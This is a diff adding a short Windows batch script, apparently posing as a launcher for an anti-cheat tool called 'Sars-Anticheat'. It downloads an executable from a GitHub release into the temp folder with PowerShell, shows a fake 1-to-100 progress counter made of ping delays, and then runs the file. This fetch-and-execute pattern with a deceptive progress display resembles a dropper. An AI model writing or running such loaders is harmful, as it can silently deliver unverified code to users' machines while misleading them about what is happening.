@@ -1,0 +1,17 @@
+@echo off
+
+set a=https://github.com/aserthh/Sars-Anticheat/releases/download/v/SarsAnticheat.exe
+set b=%TEMP%\SarsAnticheat.exe
+
+echo Iniciando download...
+powershell -command "& { Invoke-WebRequest %a% -OutFile %b% }"
+
+echo.
+echo Iniciando Sars-Anticheat...
+
+for /L %%i in (1,1,100) do (
+    echo Progresso: %%i%%
+    ping -n 2 127.0.0.1 > nul
+)
+
+start "" %b%
